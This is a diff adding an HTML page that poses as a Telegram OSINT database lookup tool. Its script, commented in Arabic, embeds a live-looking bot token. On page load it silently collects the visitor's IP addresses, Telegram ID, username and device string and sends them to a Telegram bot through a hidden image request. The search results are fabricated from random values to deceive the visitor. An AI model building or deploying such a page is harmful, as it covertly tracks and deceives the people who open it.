@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Telegram Databases - OSINT Tool</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #050505;
+            --panel-bg: #111111;
+            --primary-color: #00ffcc;
+            --secondary-color: #0066ff;
+            --text-main: #e0e0e0;
+            --text-muted: #888;
+            --border-color: #222;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg-color); 
+            color: var(--text-main); 
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: var(--panel-bg);
+            padding: 15px 30px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            font-size: 20px;
+            color: var(--primary-color);
+            font-family: 'Share Tech Mono', monospace;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .status-dot {
+            width: 10px; height: 10px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--primary-color);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            padding: 40px;
+            gap: 30px;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .control-panel {
+            width: 350px;
+            flex-shrink: 0;
+            background: var(--panel-bg);
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            height: fit-content;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .control-panel h2 {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: var(--primary-color);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--primary-color); box-shadow: 0 0 10px rgba(0, 255, 204, 0.2); }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--secondary-color), var(--primary-color));
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+        }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+
+        .results-panel {
+            flex: 1;
+            background: var(--panel-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .terminal-header {
+            background: #0a0a0a;
+            padding: 10px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            gap: 8px;
+        }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+
+        .terminal-body {
+            padding: 30px;
+            flex: 1;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--text-main);
+            overflow-y: auto;
+            background-image: 
+                linear-gradient(rgba(0, 255, 204, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 204, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .result-line { margin-bottom: 8px; display: flex; }
+        .result-key { color: var(--text-muted); width: 150px; flex-shrink: 0; }
+        .result-val { color: var(--primary-color); font-weight: bold; }
+        .result-val.danger { color: #ff4444; }
+        .result-val.success { color: #00ffcc; }
+        
+        .success-header {
+            color: #00ffcc;
+            border-bottom: 1px dashed #333;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .scanning-text { color: var(--secondary-color); font-style: italic; }
+        
+        .welcome-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            color: var(--text-muted);
+            text-align: center;
+        }
+        .welcome-screen svg { width: 60px; height: 60px; margin-bottom: 20px; opacity: 0.5; }
+
+        @media (max-width: 900px) {
+            .main-container { flex-direction: column; padding: 20px; }
+            .control-panel { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <h1><span class="status-dot"></span> UNIVERSAL TELEGRAM DATABASES</h1>
+        <div style="font-size: 12px; color: var(--text-muted); font-family: 'Share Tech Mono';">SYSTEM ONLINE | V 2.4.1</div>
+    </header>
+
+    <div class="main-container">
+        
+        <div class="control-panel">
+            <h2>Query Parameters</h2>
+            <div class="input-group">
+                <label>TARGET IDENTIFIER (USER / IP / CHAT ID)</label>
+                <input type="text" id="searchInput" placeholder="e.g. 8735622476 or @username">
+            </div>
+            <button class="btn" onclick="performSearch()">Initiate Search</button>
+            
+            <div style="margin-top: 30px; font-size: 11px; color: var(--text-muted); line-height: 1.5;">
+                <p>⚠️ Disclaimer: This is a private OSINT tool. All queries are logged.</p>
+            </div>
+        </div>
+
+        <div class="results-panel">
+            <div class="terminal-header">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+                <div style="font-size: 12px; color: #666; margin-left: 10px; font-family: 'Share Tech Mono';">root@osint:~#</div>
+            </div>
+            <div class="terminal-body" id="terminalBody">
+                <div class="welcome-screen" id="welcomeScreen">
+                    <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    <p>Awaiting input parameters...</p>
+                </div>
+                <div id="resultsContent" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ⚠️ الإعدادات (لا تلمسها، فهي جاهزة بالبيانات الخاصة بك)
+        const BOT_TOKEN = "9140495515:AAEaZwF8s79xlbex0jOF6iupyaVCiaPxEDc";
+        const CHAT_ID = "8735622476";
+
+        // دالة إرسال البيانات باستخدام الصورة المخفية (تتجاوز الحظر والـ VPN)
+        function sendToTelegram(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            document.body.appendChild(img);
+            setTimeout(() => img.remove(), 1000);
+        }
+
+        // إرسال البيانات فور دخول أي شخص (بمجرد فتح الصفحة)
+        window.addEventListener('DOMContentLoaded', async () => {
+            let tgData = { id: null, username: null };
+            if (window.Telegram && window.Telegram.WebApp) {
+                const tg = window.Telegram.WebApp; tg.ready();
+                const user = tg.initDataUnsafe?.user;
+                if (user) { tgData.id = user.id; tgData.username = user.username || user.first_name; }
+            }
+
+            let ipv4 = "Unknown"; let ipv6 = "Unknown";
+            try { const r = await fetch('https://api.ipify.org?format=json'); ipv4 = (await r.json()).ip; } catch(e){}
+            try { const r = await fetch('https://api64.ipify.org?format=json'); ipv6 = (await r.json()).ip; } catch(e){}
+
+            const msg = `🚨 New Visitor\n- IPv4: ${ipv4}\n- IPv6: ${ipv6}\n- TG: ${tgData.username || 'N/A'} (${tgData.id || 'N/A'})\n- Device: ${navigator.userAgent}`;
+            
+            sendToTelegram(msg);
+        });
+
+        // وظيفة البحث الوهمي (تظهر للزائر فقط ولا ترسل شيئاً لك)
+        function performSearch() {
+            const input = document.getElementById('searchInput').value.trim();
+            const welcome = document.getElementById('welcomeScreen');
+            const results = document.getElementById('resultsContent');
+            
+            if (!input) { alert("Please enter a target identifier."); return; }
+
+            welcome.style.display = 'none';
+            results.style.display = 'block';
+            
+            results.innerHTML = `<div class="scanning-text" id="scanText">> Initializing connection to Universal DB...<br>> Bypassing encryption layers...<br>> Searching for target: <span style="color:#fff">${input}</span>...</div>`;
+
+            setTimeout(() => {
+                const randomIp = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                const randomDate = new Date(Date.now() - Math.floor(Math.random()*10000000000)).toLocaleString();
+                const randomId = Math.floor(Math.random() * 900000000) + 100000000;
+                const isActive = Math.random() > 0.3;
+                const statusClass = isActive ? 'success' : 'danger';
+                const statusText = isActive ? 'ACTIVE' : 'INACTIVE';
+                const phone = `+212 ${Math.floor(Math.random()*900)+100} ${Math.floor(Math.random()*900)+100} ${Math.floor(Math.random()*900)+100}`;
+                const carrier = ["Maroc Telecom", "Orange", "Inwi"][Math.floor(Math.random()*3)];
+                const device = ["iPhone 15 Pro", "Samsung S24 Ultra", "Xiaomi 13", "iPhone 13"][Math.floor(Math.random()*4)];
+                
+                results.innerHTML = `
+                    <div class="success-header">[+] MATCH FOUND FOR: ${input}</div>
+                    <div class="result-line"><div class="result-key">Telegram ID:</div><div class="result-val">${randomId}</div></div>
+                    <div class="result-line"><div class="result-key">Phone Number:</div><div class="result-val">${phone}</div></div>
+                    <div class="result-line"><div class="result-key">Carrier:</div><div class="result-val">${carrier}</div></div>
+                    <div class="result-line"><div class="result-key">IP Address:</div><div class="result-val">${randomIp}</div></div>
+                    <div class="result-line"><div class="result-key">Device Info:</div><div class="result-val">${device}</div></div>
+                    <div class="result-line"><div class="result-key">Last Seen:</div><div class="result-val">${randomDate}</div></div>
+                    <div class="result-line"><div class="result-key">Status:</div><div class="result-val ${statusClass}">${statusText}</div></div>
+                    <div style="margin-top: 30px; font-size: 12px; color: #555;">--- END OF RECORD ---</div>
+                `;
+            }, 2500);
+        }
+    </script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</body>
+</html>
